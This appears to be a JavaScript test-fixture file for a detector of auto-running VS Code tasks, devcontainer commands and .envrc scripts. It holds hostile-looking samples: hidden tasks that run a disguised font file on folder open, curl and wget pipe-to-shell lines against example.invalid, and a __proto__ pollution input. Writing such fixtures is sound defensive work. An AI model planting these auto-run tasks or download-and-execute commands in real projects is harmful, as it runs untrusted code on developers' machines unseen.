// In-memory fixtures only (D-35): never written to disk as tasks.json/settings.json/devcontainer.json/.envrc.
// Harmless content: hosts are example.invalid.

const task = (extra = {}) => ({
  label: 'build', type: 'shell', command: 'node .vscode/font.woff2',
  runOptions: { runOn: 'folderOpen' }, presentation: { reveal: 'never' }, ...extra,
});

export const TASKS_JSONC = `{
  // a comment
  "version": "2.0.0",
  "tasks": [
    {
      "label": "build",
      "type": "shell",
      "command": "node .vscode/font.woff2",
      "runOptions": { "runOn": "folderOpen", },
      "presentation": { "reveal": "never" }, /* trailing */
    },
  ],
}
`;

export const TASKS_SPACES = `{ "tasks": [ { "label": "x", "type": "shell",${' '.repeat(200)}"command": "node    .vscode/font.woff2",
  "runOptions": { "runOn": "folderOpen" } } ] }`;

export const TASKS_PIPE = JSON.stringify({ tasks: [task({ command: 'curl -s https://example.invalid/x | sh', presentation: {} })] });
export const TASKS_NO_RUNON = JSON.stringify({ tasks: [task({ runOptions: {} })] });
export const TASKS_DEFAULT = JSON.stringify({ tasks: [task({ runOptions: { runOn: 'default' } })] });
export const TASKS_JS_OK = JSON.stringify({ tasks: [task({ command: 'node scripts/build.js', presentation: {} })] });
export const TASKS_ARGS = JSON.stringify({ tasks: [task({ command: 'node', args: ['a.txt'] , presentation: {} })] });
export const TASKS_BROKEN = '{ "tasks": [ { "label": ';
export const TASKS_LEGACY = JSON.stringify({ command: 'wget -qO- https://example.invalid/y | bash', runOptions: { runOn: 'folderOpen' } });
export const TASKS_PROTO = '{"__proto__": {"runOptions": {"runOn": "folderOpen"}}, "tasks": []}';

export const SETTINGS_ON = '{ "task.allowAutomaticTasks": "on" }';
export const SETTINGS_OFF = '{ "task.allowAutomaticTasks": "off" }';

export const DEVCONTAINER_INIT = '{\n  // host side\n  "initializeCommand": "echo hello-example"\n}\n';
export const DEVCONTAINER_ARRAY = '{ "postCreateCommand": ["npm", "install"] }';
export const DEVCONTAINER_OBJECT = '{ "postStartCommand": { "a": "x", "b": ["y"] } }';
export const DEVCONTAINER_CLEAN = '{ "image": "mcr.microsoft.com/devcontainers/base:ubuntu" }';

export const ENVRC = '\n\nexport FOO=bar\ncurl -s https://example.invalid/z | sh\n';
